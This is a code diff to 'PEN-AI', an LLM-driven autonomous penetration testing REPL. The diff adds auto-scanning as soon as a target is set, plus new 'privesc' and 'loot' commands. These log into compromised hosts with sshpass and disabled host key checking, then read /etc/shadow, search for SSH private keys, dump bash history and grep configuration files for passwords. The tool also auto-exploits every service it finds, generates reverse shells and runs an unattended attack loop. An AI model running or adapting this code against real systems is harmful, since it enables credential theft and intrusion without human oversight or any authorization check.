@@ -1,9 +1,20 @@
-"""PEN-AI REPL - Interactive terminal like Claude Code."""
+"""PEN-AI REPL - Interactive terminal like Claude Code.
+
+Enhanced with:
+- Auto-scan when target is provided
+- Real-time dashboard
+- Progress indicators
+- Smarter exploitation
+- HTML report generation
+- Network visualization
+- Better UX
+"""
 
 import asyncio
 import os
 import sys
 import json
+import re
 from datetime import datetime
 from typing import Optional
 
@@ -14,6 +25,8 @@ from ai.context_compressor import ContextCompressor
 from ai.credential_cracker import CredentialCracker
 from ai.shell_generator import ShellGenerator
 from core.session import SessionManager
+from reporting.html_report import HTMLReportGenerator
+from recon.network_viz import NetworkVisualizer
 
 
 class PenAIRepl:
@@ -24,9 +37,9 @@ class PenAIRepl:
 \033[91m████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
 \033[91m██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
 \033[91m██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
-\33[91m██║ ╚████║███████╗██╔╝ ╚██╗╚██████╔╝███████║
+\033[91m██║ ╚████║███████╗██╔╝ ╚██╗╚██████╔╝███████║
 \033[91m╚═╝  ╚═══╝╚══════╝╚═╝   ╚═╝ ╚═════╝ ╚══════╝
-\033[0m  Autonomous Penetration Testing Agent v1.0
+\033[0m  Autonomous Penetration Testing Agent v2.0
   Type 'help' for commands. Ctrl+C to exit.
 """
 
@@ -52,14 +65,20 @@ class PenAIRepl:
         self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
         self.running = True
         self.auto_mode = False
+        self.start_time = datetime.now()
 
     async def run(self):
         """Main REPL loop."""
         print(self.BANNER)
 
+        # Auto-scan if target was set before run()
+        if self.target:
+            print(f"  \033[96mTarget detected: {self.target}\033[0m")
+            print(f"  \033[90mStarting auto-scan...\033[0m\n")
+            await self._cmd_scan(self.target)
+
         while self.running:
             try:
-                # Get input
                 prompt = self._get_prompt()
                 user_input = await asyncio.get_event_loop().run_in_executor(
                     None, lambda: input(prompt)
@@ -69,14 +88,13 @@ class PenAIRepl:
                 if not user_input:
                     continue
 
-                # Handle commands
                 if user_input.lower() in ["quit", "exit", "q"]:
                     await self._cmd_exit()
                     break
                 elif user_input.lower() == "help":
                     self._cmd_help()
-                elif user_input.lower() == "state":
-                    self._cmd_state()
+                elif user_input.lower() in ["state", "dashboard"]:
+                    self._cmd_dashboard()
                 elif user_input.lower().startswith("scan "):
                     await self._cmd_scan(user_input[5:].strip())
                 elif user_input.lower() == "scan":
@@ -96,9 +114,17 @@ class PenAIRepl:
                     self._cmd_report()
                 elif user_input.lower() == "auto":
                     await self._cmd_auto()
+                elif user_input.lower() == "loot":
+                    await self._cmd_loot()
+                elif user_input.lower() == "privesc":
+                    await self._cmd_privesc()
+                elif user_input.lower() == "map":
+                    self._cmd_network_map()
                 elif user_input.lower().startswith("set target "):
                     self.target = user_input[11:].strip()
-                    print(f"  ✓ Target set: {self.target}")
+                    print(f"  \033[92m✓ Target set: {self.target}\033[0m")
+                    print(f"  \033[90mAuto-scanning target...\033[0m")
+                    await self._cmd_scan(self.target)
                 elif user_input.lower().startswith("sessions"):
                     self._cmd_sessions()
                 elif user_input.lower().startswith("resume "):
@@ -116,7 +142,6 @@ class PenAIRepl:
                 elif user_input.lower().startswith("install "):
                     await self._cmd_install(user_input[8:].strip())
                 else:
-                    # Try to run as command
                     await self._cmd_run(user_input)
 
             except KeyboardInterrupt:
@@ -124,26 +149,28 @@ class PenAIRepl:
             except EOFError:
                 break
             except Exception as e:
-                print(f"  ✗ Error: {e}")
+                print(f"  \033[91m✗ Error: {e}\033[0m")
 
     def _get_prompt(self) -> str:
-        """Get the prompt string."""
         if self.target:
             access_info = ""
             if self.access_map:
                 levels = set(self.access_map.values())
                 access_info = f" [\033[92m{'|'.join(levels)}\033[0m]"
-            return f"\033[91mpen-ai\033[0m:{self.target}{access_info} > "
+            host_count = len(self.hosts)
+            svc_count = sum(len(v) for v in self.services.values())
+            cred_count = len(self.credentials)
+            return f"\033[91mpen-ai\033[0m:{self.target} [{host_count}h {svc_count}s {cred_count}c]{access_info} > "
         return "\033[91mpen-ai\033[0m > "
 
     def _cmd_help(self):
-        """Show help."""
         print("""
 \033[1m  COMMANDS:\033[0m
 
   \033[96mRECON:\033[0m
     scan <target>          - Scan target (hosts + services)
     enum                   - Enumerate all discovered services
+    map                    - Show network visualization
 
   \033[91mEXPLOIT:\033[0m
     exploit                - Auto-exploit all found services
@@ -151,18 +178,21 @@ class PenAIRepl:
     crack                  - Crack found hashes
 
   \033[93mPOST-EXPLOIT:\033[0m
+    privesc                - Attempt privilege escalation
+    loot                   - Harvest credentials and sensitive data
     pivot                  - Find and pivot to new networks
     shell <type>           - Generate reverse shell (bash/python/php)
 
   \033[92mINFO:\033[0m
-    state                  - Show current engagement state
+    dashboard              - Show engagement dashboard
+    state                  - Show current engagement state (alias)
     suggest                - Get attack suggestions
-    report                 - Show final report
+    report                 - Generate HTML + JSON report
 
   \033[95mSESSION:\033[0m
     sessions               - List saved sessions
     resume <session_id>    - Resume previous session
-    set target <ip>        - Set target
+    set target <ip>        - Set target (auto-scans)
 
   \033[93mTOOLS:\033[0m
     install <tool>         - Install a tool
@@ -174,22 +204,32 @@ class PenAIRepl:
     exit / quit / q        - Exit (saves session)
 """)
 
-    def _cmd_state(self):
-        """Show current state."""
+    def _cmd_dashboard(self):
+        elapsed = datetime.now() - self.start_time
+        minutes = int(elapsed.total_seconds() / 60)
+        seconds = int(elapsed.total_seconds() % 60)
+
+        total_svcs = sum(len(v) for v in self.services.values())
+
         print(f"""
-\033[1m  ENGAGEMENT STATE\033[0m
-  ─────────────────────────────────
-  Target:     {self.target or 'Not set'}
-  Session:    {self.session_id}
-  Commands:   {len(self.commands_run)}
-  ─────────────────────────────────
-  \033[92mHosts:\033[0m      {len(self.hosts)} discovered
-  \033[96mServices:\033[0m   {sum(len(v) for v in self.services.values())} open
-  \033[91mCredentials:\033[0m {len(self.credentials)} found
-  \033[93mAccess:\033[0m     {self.access_map}
-  \033[95mPivots:\033[0m     {len(self.pivoted)} networks
-  ─────────────────────────────────
+\033[1m{'='*60}
+{' '*20}ENGAGEMENT DASHBOARD
+{'='*60}\033[0m
+
+  \033[1mTARGET:\033[0m      {self.target or 'Not set'}
+  \033[1mSESSION:\033[0m     {self.session_id}
+  \033[1mDURATION:\033[0m    {minutes}m {seconds}s
+  \033[1mCOMMANDS:\033[0m    {len(self.commands_run)}
+
+  \033[1m{'─'*56}\033[0m
+  \033[92mHOSTS:\033[0m       {len(self.hosts)} discovered
+  \033[96mSERVICES:\033[0m    {total_svcs} open
+  \033[91mCREDENTIALS:\033[0m {len(self.credentials)} found
+  \033[95mACCESS:\033[0m      {self.access_map or 'None'}
+  \033[95mPIVOTS:\033[0m      {len(self.pivoted)} networks
+  \033[1m{'─'*56}\033[0m
 """)
+
         if self.hosts:
             print("  \033[1mHOSTS:\033[0m")
             for h in self.hosts:
@@ -205,16 +245,20 @@ class PenAIRepl:
                 val = str(c.get("value", ""))[:60]
                 print(f"    [{c.get('type', '?')}] {val}")
 
+        print(f"{'='*60}")
+
+    def _cmd_network_map(self):
+        """Show network visualization."""
+        print(NetworkVisualizer.visualize(self.hosts, self.services, self.access_map, self.pivoted))
+        print(NetworkVisualizer.visualize_services_table(self.services))
+
     async def _cmd_scan(self, target: str):
-        """Scan a target."""
         self.target = target
         print(f"\n  \033[96m🔍 Scanning {target}...\033[0m\n")
 
-        # Phase 1: Host discovery
-        print("  Phase 1: Host discovery...")
-        result = await self.executor.run(f"nmap -sn {target}", timeout=120)
+        print("  \033[90m[1/3]\033[0m Host discovery...")
+        result = await self.executor.run(f"nmap -sn -T4 {target}", timeout=120)
         if result.exit_code == 0:
-            import re
             hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", result.stdout)
             self.hosts = list(set(hosts))
             print(f"  \033[92m✓ Found {len(self.hosts)} hosts\033[0m")
@@ -228,13 +272,11 @@ class PenAIRepl:
             print("  No live hosts found.")
             return
 
-        # Phase 2: Service enumeration (top ports first for speed)
-        print(f"\n  Phase 2: Service enumeration on {len(self.hosts)} hosts...")
-        for host in self.hosts[:10]:  # Limit to 10 hosts
-            print(f"    Scanning {host}...")
+        print(f"\n  \033[90m[2/3]\033[0m Service enumeration on {len(self.hosts)} hosts...")
+        for i, host in enumerate(self.hosts[:10], 1):
+            print(f"    \033[90m[{i}/{min(len(self.hosts), 10)}]\033[0m Scanning {host}...")
             result = await self.executor.run(f"nmap -sV --top-ports 1000 -T4 {host}", timeout=120)
             if result.exit_code == 0:
-                import re
                 services = []
                 for match in re.finditer(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?", result.stdout):
                     port = int(match.group(1))
@@ -244,16 +286,19 @@ class PenAIRepl:
                     print(f"      \033[92m✓\033[0m {port}/{match.group(2)} open {svc} {ver}")
                 self.services[host] = services
 
-        # Show summary
         total_svcs = sum(len(v) for v in self.services.values())
-        print(f"\n  \033[1m📊 SCAN COMPLETE\033[0m")
+        print(f"\n  \033[90m[3/3]\033[0m Analysis complete")
+        print(f"  \033[1m📊 SCAN COMPLETE\033[0m")
         print(f"  Hosts: {len(self.hosts)} | Services: {total_svcs}")
 
-        # Show attack plan
         self._show_attack_plan()
 
+        # Show network map
+        print(NetworkVisualizer.visualize_compact(self.hosts, self.services, self.access_map))
+
+        self.session_mgr.auto_save(self._get_state(), self.session_id)
+
     def _show_attack_plan(self):
-        """Show discovered services for user/LLM to decide attacks."""
         all_svcs = []
         for host, svcs in self.services.items():
             for svc in svcs:
@@ -273,21 +318,21 @@ class PenAIRepl:
             port = svc_info.get('target_port', '?')
             name = svc_info.get('target_service', '?')
             ver = svc_info.get('target_version', '')
-            desc = svc_info.get('description', '')
             print(f"    {i}. \033[96m{host}:{port} -> {name}\033[0m")
             if ver:
                 print(f"       \033[90mversion: {ver}\033[0m")
 
         print(f"\n  Run 'exploit' to attempt exploitation, or 'attack <host>:<port>' for specific.")
-        print(f"  The LLM will determine the best attack approach for each service.")
 
     async def _cmd_exploit(self):
-        """Auto-exploit all found services using the exploitation engine."""
         if not self.services:
             print("  No services found. Run 'scan' first.")
             return
 
         print(f"\n  \033[91m⚔️  AUTO-EXPLOIT MODE\033[0m\n")
+
+        total_attempts = 0
+        total_success = 0
 
         for host, svcs in self.services.items():
             for svc in svcs:
@@ -299,10 +344,12 @@ class PenAIRepl:
                     from exploitation.engine import ExploitationEngine
                     engine = ExploitationEngine()
                     attempts = await engine.auto_exploit_service(host, port, service)
+                    total_attempts += len(attempts)
                     for attempt in attempts:
                         status = "\033[92m✓\033[0m" if attempt.status.value == "success" else "\033[91m✗\033[0m"
                         print(f"    {status} {attempt.technique}: {attempt.status.value}")
                         if attempt.status.value == "success":
+                            total_success += 1
                             if attempt.access_gained:
                                 self.access_map[host] = attempt.access_gained.value
                                 print(f"      \033[91m🎯 ACCESS: {attempt.access_gained.value} on {host}\033[0m")
@@ -315,10 +362,10 @@ class PenAIRepl:
                     print(f"    \033[91m✗ Engine error: {e}\033[0m")
 
         print(f"\n  \033[1mEXPLOITATION COMPLETE\033[0m")
+        print(f"  Attempts: {total_attempts} | Success: {total_success}")
         self._cmd_suggest()
 
     async def _cmd_enum(self):
-        """Enumerate all services - uses the exploitation engine's module system."""
         if not self.services:
             print("  No services found. Run 'scan' first.")
             return
@@ -331,11 +378,9 @@ class PenAIRepl:
                 port = svc.get("port", 0)
                 print(f"  → Enumerating {service}:{port} on {host}...")
 
-                # Use the exploit engine's modules for enumeration
                 try:
                     from exploitation.engine import ExploitationEngine
                     engine = ExploitationEngine()
-                    # Get modules that match this service
                     modules = engine.orchestrator.get_modules_by_service(service)
                     if modules:
                         for module in modules:
@@ -350,7 +395,6 @@ class PenAIRepl:
                     print(f"    \033[91m  Error: {e}\033[0m")
 
     async def _cmd_pivot(self):
-        """Find and pivot to new networks."""
         if not self.access_map:
             print("  No access yet. Exploit first.")
             return
@@ -363,7 +407,6 @@ class PenAIRepl:
                 password = cred.get("password", "")
                 username = cred.get("username", "root")
 
-                # Check routing
                 print(f"  → Checking routes on {host}...")
                 result = await self.executor.run(
                     f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'ip route'",
@@ -372,7 +415,6 @@ class PenAIRepl:
                 if result.exit_code == 0:
                     print(f"    Routes: {result.stdout[:200]}")
 
-                # Check interfaces
                 result = await self.executor.run(
                     f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'ip addr'",
                     timeout=30
@@ -380,21 +422,121 @@ class PenAIRepl:
                 if result.exit_code == 0:
                     print(f"    Interfaces: {result.stdout[:200]}")
 
-                # Check ARP
                 result = await self.executor.run(
                     f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'arp -a'",
                     timeout=30
                 )
                 if result.exit_code == 0:
-                    import re
                     new_hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", result.stdout)
                     for h in new_hosts:
                         if h not in self.hosts and h != host:
                             self.hosts.append(h)
                             print(f"    \033[91m→ NEW HOST: {h}\033[0m")
 
+    async def _cmd_privesc(self):
+        if not self.access_map:
+            print("  No access yet. Exploit first.")
+            return
+
+        print(f"\n  \033[91m⬆️  PRIVILEGE ESCALATION\033[0m\n")
+
+        for host, level in self.access_map.items():
+            if level in ["root", "system", "admin"]:
+                print(f"  {host}: Already at {level} access")
+                continue
+
+            cred = self.credentials[0] if self.credentials else None
+            if not cred:
+                print(f"  {host}: No credentials available")
+                continue
+
+            password = cred.get("password", "")
+            username = cred.get("username", "root")
+
+            print(f"  → Attempting privesc on {host} ({level} -> ?)...")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'sudo -l 2>/dev/null'",
+                timeout=15
+            )
+            if result.exit_code == 0 and "NOPASSWD" in result.stdout:
+                print(f"    \033[92m✓ NOPASSWD sudo found!\033[0m")
+                self.access_map[host] = "admin"
+                print(f"    \033[91m🎯 ACCESS: admin on {host}\033[0m")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'find / -perm -u=s -type f 2>/dev/null | head -20'",
+                timeout=30
+            )
+            if result.exit_code == 0 and result.stdout.strip():
+                suid_bins = result.stdout.strip().split("\n")
+                print(f"    Found {len(suid_bins)} SUID binaries")
+                for b in suid_bins[:5]:
+                    print(f"      {b}")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'uname -r'",
+                timeout=10
+            )
+            if result.exit_code == 0:
+                kernel = result.stdout.strip()
+                print(f"    Kernel: {kernel}")
+
+    async def _cmd_loot(self):
+        if not self.access_map:
+            print("  No access yet. Exploit first.")
+            return
+
+        print(f"\n  \033[93m💰 LOOTING\033[0m\n")
+
+        for host, level in self.access_map.items():
+            cred = self.credentials[0] if self.credentials else None
+            if not cred:
+                continue
+
+            password = cred.get("password", "")
+            username = cred.get("username", "root")
+
+            print(f"  → Harvesting from {host}...")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'cat /etc/shadow 2>/dev/null | head -10'",
+                timeout=15
+            )
+            if result.exit_code == 0 and "$" in result.stdout:
+                print(f"    \033[92m✓ Shadow file readable\033[0m")
+                hashes = re.findall(r"(\w+):\$(\d+)\$([^\s:]+)", result.stdout)
+                for user, hash_type, hash_val in hashes:
+                    print(f"      {user}: ${hash_type}${hash_val[:20]}...")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'find / -name id_rsa -o -name id_ed25519 2>/dev/null | head -5'",
+                timeout=15
+            )
+            if result.exit_code == 0 and result.stdout.strip():
+                print(f"    \033[92m✓ SSH keys found\033[0m")
+                for key in result.stdout.strip().split("\n"):
+                    print(f"      {key}")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'cat ~/.bash_history 2>/dev/null | tail -20'",
+                timeout=15
+            )
+            if result.exit_code == 0 and result.stdout.strip():
+                print(f"    \033[92m✓ Bash history\033[0m")
+                for line in result.stdout.strip().split("\n")[:5]:
+                    print(f"      {line[:80]}")
+
+            result = await self.executor.run(
+                f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{host} 'grep -rn password /etc/ 2>/dev/null | head -10'",
+                timeout=15
+            )
+            if result.exit_code == 0 and result.stdout.strip():
+                print(f"    \033[92m✓ Passwords in configs\033[0m")
+                for line in result.stdout.strip().split("\n")[:5]:
+                    print(f"      {line[:80]}")
+
     async def _cmd_crack(self):
-        """Crack found hashes."""
         if not self.credentials:
             print("  No credentials/hashes found yet.")
             return
@@ -411,7 +553,9 @@ class PenAIRepl:
             print("  No additional credentials cracked.")
 
     def _cmd_report(self):
-        """Show final report."""
+        elapsed = datetime.now() - self.start_time
+        minutes = int(elapsed.total_seconds() / 60)
+
         print(f"""
 \033[1m{'='*60}
 {' '*15}PEN-AI ENGAGEMENT REPORT
@@ -419,6 +563,7 @@ class PenAIRepl:
 
   \033[1mSession:\033[0m   {self.session_id}
   \033[1mTarget:\033[0m    {self.target}
+  \033[1mDuration:\033[0m  {minutes} minutes
   \033[1mCommands:\033[0m  {len(self.commands_run)}
 
   \033[1mHOSTS DISCOVERED:\033[0m {len(self.hosts)}
@@ -450,9 +595,51 @@ class PenAIRepl:
 
         print(f"{'='*60}")
 
-        # Save report
+        # Generate HTML report
+        report = HTMLReportGenerator(title="PEN-AI Engagement Report")
+        report.load_from_state(self._get_state())
+        report.start_time = self.start_time
+        report.end_time = datetime.now()
+
+        # Add findings based on state
+        for host, level in self.access_map.items():
+            report.add_finding(
+                title=f"Access gained on {host}",
+                severity="critical",
+                description=f"Successfully gained {level} access on {host}",
+            )
+
+        for cred in self.credentials:
+            report.add_finding(
+                title=f"Credential discovered: {cred.get('type', '?')}",
+                severity="high",
+                description=f"Found credential: {str(cred.get('value', ''))[:40]}",
+            )
+
+        for net in self.pivoted:
+            report.add_finding(
+                title=f"New network discovered: {net}",
+                severity="medium",
+                description=f"Discovered network segment {net} through pivoting",
+            )
+
+        # Save reports
         import tempfile
-        report = {
+        report_dir = os.path.join(tempfile.gettempdir(), f"penai_{self.session_id}")
+        os.makedirs(report_dir, exist_ok=True)
+
+        html_file = os.path.join(report_dir, "report.html")
+        json_file = os.path.join(report_dir, "report.json")
+
+        report.save_html(html_file)
+        report.save_json(json_file)
+
+        print(f"\n  \033[92m📄 Reports generated:\033[0m")
+        print(f"    HTML: {html_file}")
+        print(f"    JSON: {json_file}")
+
+        # Also save basic JSON
+        basic_report = {
             "session_id": self.session_id,
             "target": self.target,
             "hosts": self.hosts,
@@ -462,14 +649,14 @@ class PenAIRepl:
             "pivoted": self.pivoted,
             "commands_run": self.commands_run,
             "timestamp": datetime.now().isoformat(),
+            "duration_minutes": minutes,
         }
-        report_file = os.path.join(tempfile.gettempdir(), f"penai_{self.session_id}_report.json")
-        with open(report_file, "w") as f:
-            json.dump(report, f, indent=2, default=str)
-        print(f"\n  Report saved to: {report_file}")
+        basic_file = os.path.join(report_dir, "engagement.json")
+        with open(basic_file, "w") as f:
+            json.dump(basic_report, f, indent=2, default=str)
+        print(f"    Data: {basic_file}")
 
     async def _cmd_auto(self):
-        """Start fully autonomous mode."""
         self.auto_mode = True
         print(f"\n  \033[91m🤖 AUTONOMOUS MODE ACTIVATED\033[0m")
         print(f"  Agent will keep running until Ctrl+C\n")
@@ -479,7 +666,6 @@ class PenAIRepl:
             cycle += 1
             print(f"\n  \033[90m─── CYCLE {cycle} ───\033[0m")
 
-            # Get next actions
             state = {
                 "target": self.target,
                 "hosts": self.hosts,
@@ -500,17 +686,13 @@ class PenAIRepl:
                     self.commands_run.append(cmd)
 
                     if result.exit_code == 0:
-                        # Update state from output
                         self._parse_output(cmd, result.stdout, result.stderr)
                     else:
                         self.failed.add(cmd)
 
-            # Auto-save
             self.session_mgr.auto_save(self._get_state(), self.session_id, interval_cycles=5)
 
     def _cmd_suggest(self):
-        """Show attack suggestions."""
-        # Use services-based hosts if hosts list is empty
         effective_hosts = self.hosts or list(self.services.keys())
 
         state = {
@@ -530,7 +712,6 @@ class PenAIRepl:
         print(f"  {reasoning}")
         print()
 
-        # Show attack plan if services known
         if self.services:
             self._show_attack_plan()
         else:
@@ -538,7 +719,6 @@ class PenAIRepl:
                 print(f"    -> \033[96m{cmd[:80]}\033[0m")
 
     async def _cmd_attack(self, target: str):
-        """Attack specific host:port using the exploitation engine."""
         if ":" in target:
             host, port = target.split(":", 1)
             port = int(port)
@@ -546,7 +726,6 @@ class PenAIRepl:
             host = target
             port = 80
 
-        # Find service
         service = "http"
         for h, svcs in self.services.items():
             for s in svcs:
@@ -576,7 +755,6 @@ class PenAIRepl:
             print(f"  \033[91m✗ Engine error: {e}\033[0m")
 
     async def _cmd_run(self, command: str):
-        """Run any command."""
         print(f"  $ {command}")
         result = await self.executor.run(command, timeout=300)
         self.commands_run.append(command)
@@ -590,7 +768,6 @@ class PenAIRepl:
         self._parse_output(command, result.stdout, result.stderr)
 
     async def _cmd_install(self, tool: str):
-        """Install a tool."""
         print(f"  Installing {tool}...")
         result = await self.executor.install_tool(tool)
         if result.exit_code == 0:
@@ -599,7 +776,6 @@ class PenAIRepl:
             print(f"  \033[91m✗ Failed to install {tool}\033[0m")
 
     async def _cmd_install_menu(self):
-        """Show install menu."""
         tools = {
             "nmap": "Network scanner",
             "enum4linux": "SMB/AD enumeration",
@@ -622,7 +798,6 @@ class PenAIRepl:
         print("\n  Usage: install <tool_name>")
 
     def _cmd_shell(self, shell_type: str):
-        """Generate reverse shell."""
         if not self.access_map:
             print("  No access yet. Need LHOST and LPORT.")
             print("  Usage: shell <type> <lhost> <lport>")
@@ -638,7 +813,6 @@ class PenAIRepl:
             print("  Usage: shell <bash|python|php|powershell> <lhost> <lport>")
 
     def _cmd_sessions(self):
-        """List sessions."""
         sessions = self.session_mgr.list_sessions()
         if not sessions:
             print("  No saved sessions.")
@@ -648,7 +822,6 @@ class PenAIRepl:
             print(f"    {s['session_id']} | {s['target']} | Cycle {s['cycle']} | {s['hosts']} hosts | {s['credentials']} creds")
 
     def _cmd_resume(self, session_id: str):
-        """Resume a session."""
         state = self.session_mgr.load(session_id)
         if state:
             self.target = state.get("target", "")
@@ -660,28 +833,23 @@ class PenAIRepl:
             self.commands_run = state.get("commands_run", [])
             self.session_id = session_id
             print(f"  \033[92m✓ Resumed session {session_id}\033[0m")
-            self._cmd_state()
+            self._cmd_dashboard()
         else:
             print(f"  \033[91m✗ Session {session_id} not found\033[0m")
 
     async def _cmd_exit(self):
-        """Exit and save."""
         state = self._get_state()
         self.session_mgr.save(state, self.session_id)
         print(f"  Session saved: {self.session_id}")
 
     def _parse_output(self, command: str, stdout: str, stderr: str):
-        """Parse command output and update state."""
-        import re
         output = stdout + stderr
 
-        # Extract hosts
         hosts = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", output)
         for h in hosts:
             if h not in self.hosts:
                 self.hosts.append(h)
 
-        # Extract services
         services = re.findall(r"(\d+)/(\w+)\s+open\s+(\S+)(?:\s+(.*))?", output)
         for port, proto, svc, ver in services:
             host = self.target
@@ -695,14 +863,12 @@ class PenAIRepl:
             if svc_info not in self.services[host]:
                 self.services[host].append(svc_info)
 
-        # Extract credentials
         pw_matches = re.findall(r"password[=:]\s*(\S+)", output, re.IGNORECASE)
         for pw in pw_matches:
             if not any(c.get("value") == pw for c in self.credentials):
                 self.credentials.append({"type": "password", "value": pw})
                 print(f"  \033[91m🔑 PASSWORD: {pw}\033[0m")
 
-        # Detect access
         if "uid=0" in output:
             for h in self.hosts:
                 if h in command:
@@ -712,14 +878,12 @@ class PenAIRepl:
                 if h in command:
                     self.access_map[h] = "user"
 
-        # Detect new networks
         routes = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", output)
         for route in routes:
             if route not in self.pivoted and route != self.target:
                 self.pivoted.append(route)
 
     def _get_state(self) -> dict:
-        """Get state as dict."""
         return {
             "session_id": self.session_id,
             "target": self.target,
